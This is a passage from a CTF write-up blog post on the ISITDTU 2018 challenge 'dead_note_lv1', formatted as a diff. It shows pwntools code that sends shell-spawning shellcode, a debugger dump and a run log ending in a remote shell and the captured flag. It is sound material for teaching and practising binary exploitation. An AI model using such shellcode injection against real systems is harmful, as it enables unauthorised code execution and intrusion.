+<p>With 255 bytes, we’re free to do any shellcode, so we’ll just be sending a <code class="language-plaintext highlighter-rouge">sh()</code> .</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">11</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>We add a padding at the start of our payload, since <code class="language-plaintext highlighter-rouge">rsi</code> is pointing to the start of our input, and we already moved 11 bytes in our shellcode, so after sending this shellcode</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[-------------------------------------code-------------------------------------]
+   0x7fffffffe4a7:  rex.B
+   0x7fffffffe4a8:  rex.B
+   0x7fffffffe4a9:  rex.B
+=&gt; 0x7fffffffe4aa:  rex.B push 0x68
+   0x7fffffffe4ad:  movabs rax,0x732f2f2f6e69622f
+   0x7fffffffe4b7:  push   rax
+   0x7fffffffe4b8:  mov    rdi,rsp
+   0x7fffffffe4bb:  push   0x1016972
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe498 --&gt; 0x555555554c3f (mov    rdx,QWORD PTR [rbp-0x8])
+0008| 0x7fffffffe4a0 ('A' &lt;repeats 11 times&gt;, "jhH¸/bin///sPH\211çhri\001\001\201\064$\001\001\001\001\061öVj\b^H\001æVH\211æ1Òj;X\017\005\nÿ\177")</code></pre></figure>
+
+<p>our existing shellcode was overwritten and it continues execution on <code class="language-plaintext highlighter-rouge">0x7fffffffe4aa</code> where our <code class="language-plaintext highlighter-rouge">sh()</code> shellcode now starts, finally rewarding us with a shell.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">deadnote python working.py 1
+[*] '/vagrant/Challenges/isit/pwn/deadnote/dead_note_lv1'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to 159.89.197.67 on port 3333: Done
+[*] Create dummy note on heap
+[*] Write payload to heap
+[*] Remove dummy note and write first payload opcode to heap
+[*] Send stager shellcode as input to atoi
+[*] Send sh() shellcode to trigger shell
+[*] Switching to interactive mode
+$ cd /home/dead_note_lv1
+$ cat flag
+ISITDTU{756d6e4267751936c6b045ae7bbfc26f}</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=ISITDTU CTF 2018 Quals - dead_note_lv1&amp;url=https://kileak.github.io/ctf/2018/isitdtu-deadnote1/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/isitdtu-deadnote1/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/isitdtu-deadnote1';
+        var disqus_title = 'ISITDTU CTF 2018 Quals - dead_note_lv1';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/isitdtu-deadnote1';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
